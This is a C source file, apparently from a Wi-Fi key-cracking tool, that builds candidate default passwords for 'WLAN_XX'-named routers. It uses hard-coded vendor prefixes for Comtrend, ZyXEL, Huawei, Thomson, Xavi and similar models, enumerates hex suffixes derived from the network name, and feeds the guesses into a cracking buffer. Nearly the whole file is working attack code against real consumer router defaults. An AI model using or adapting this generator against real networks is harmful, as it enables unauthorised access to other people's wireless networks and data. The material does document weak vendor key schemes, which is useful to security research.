/*********************************************************************************
 * Copyright (c) 2009, Chema Garcia                                              *
 * All rights reserved.                                                          *
 *                                                                               *
 * Redistribution and use in source and binary forms, with or                    *
 * without modification, are permitted provided that the following               *
 * conditions are met:                                                           *
 *                                                                               *
 *    * Redistributions of source code must retain the above                     *
 *      copyright notice, this list of conditions and the following              *
 *      disclaimer.                                                              *
 *                                                                               *
 *    * Redistributions in binary form must reproduce the above                  *
 *      copyright notice, this list of conditions and the following              *
 *      disclaimer in the documentation and/or other materials provided          *
 *      with the distribution.                                                   *
 *                                                                               *
 *    * Neither the name of the SafetyBits nor the names of its contributors may *
 *      be used to endorse or promote products derived from this software        *
 *      without specific prior written permission.                               *
 *                                                                               *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"   *
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE     *
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE    *
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE     *
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR           *
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF          *
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS      *
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN       *
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)       *
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE    *
 * POSSIBILITY OF SUCH DAMAGE.                                                   *
 *********************************************************************************/

#include <string.h>

#include "includes/main.h"
#include "includes/ciphers.h"
#include "includes/algorithms.h"

#include "algorithms/wlanlike.h"

static void wlan_algorithm ( const char *prefix , struct crackdata *crack , int suffix )
{
    unsigned char   pwd[PASSWD_LEN];
    unsigned char   *tmp;
    register int    i = 0 , j = 0;

    for ( i = 0 ; i <= 0xFFFF && !crack->net->pwd.checked ; i++ )
    {
        snprintf ( (char*) pwd , sizeof ( pwd ) , "%s%04X%02X" , prefix , i , suffix );
        tmp = (unsigned char*) strdup ( (char*) pwd );
        cbuffer_write(crack->buffer,(void*)tmp);
    }

    for ( i = 0 ; i <= 0xFFFF && !crack->net->pwd.checked ; i++ )
        for ( j = 0 ; j <= 0xFF && !crack->net->pwd.checked ; j++ )
        {
            if ( j == suffix )
                continue;

            snprintf ( (char*) pwd , sizeof ( pwd ) , "%s%04X%02X" , prefix , i , j );
            tmp = (unsigned char*) strdup ( (char*) pwd );
            cbuffer_write(crack->buffer,(void*)tmp);
        }

    return;
}

void wlan_like ( struct crackdata *crack , unsigned int pattern )
{
    int     avoid = 0;
    char    *p = strstr(crack->net->essid,"_");

    if ( p != 0  && strlen(p) > 1 )
        sscanf ( &p[1] , "%x" , &avoid );

    switch ( pattern )
    {
        /* COMTREND ROUTERS */
    case COMTREND_MODEL_CT535:
        wlan_algorithm("C0030DA" , crack , avoid );
        break;

    case COMTREND_MODEL_AR5381U:
        wlan_algorithm("C001D20" , crack , avoid );
        break;

    case COMTREND_MODEL_CT536T:
        wlan_algorithm("C0030DA" , crack , avoid );
        wlan_algorithm("C001D20" , crack , avoid );
        wlan_algorithm("E001D20" , crack , avoid );
        wlan_algorithm("C64680C" , crack , avoid );
        break;

        /* ZCOM ROUTER */
    case ZCOM_MODEL_GENERIC:
        wlan_algorithm("Z001349" , crack , avoid );
        break;

        /* ZYXEL ROUTER */
    case ZYXEL_MODEL_P660HWD1:
        wlan_algorithm("Z001349" , crack , avoid );
        wlan_algorithm("Z0002CF" , crack , avoid );
        break;

    case ZYXEL_MODEL_P6X0HW:
        wlan_algorithm("Z001349" , crack , avoid );
        wlan_algorithm("Z00A0C5" , crack , avoid );
        break;

    case ZYXEL_MODEL_P660HW_FTTH:
        wlan_algorithm("Z0002CF" , crack , avoid );
        wlan_algorithm("Z0019CB" , crack , avoid );
        break;

    case ZYXEL_MODEL_P660HW_D1:
        wlan_algorithm("Z0023F8" , crack , avoid );
        wlan_algorithm("Z404A03" , crack , avoid );
        break;

    case HUAWEI_MODEL_HG520V_FTTH:
        wlan_algorithm("H538FBF" , crack , avoid );
        wlan_algorithm("H4A69BA" , crack , avoid );
        break;

    case THOMSON_MODEL_GENERIC:
        wlan_algorithm("T5YF69A" , crack , avoid );
        break;

    case XAVI_MODEL_7768R:
        wlan_algorithm("X000138" , crack , avoid );
        break;

    case XAVI_MODEL_7968_SOLOS_461X:
        wlan_algorithm("XE09153" , crack , avoid );
        break;

    case ZYGATE_MODEL_GENERIC:
        wlan_algorithm("Z0002CF" , crack , avoid );
        wlan_algorithm("Z0023F8" , crack , avoid );
        break;
    }

    return;
}
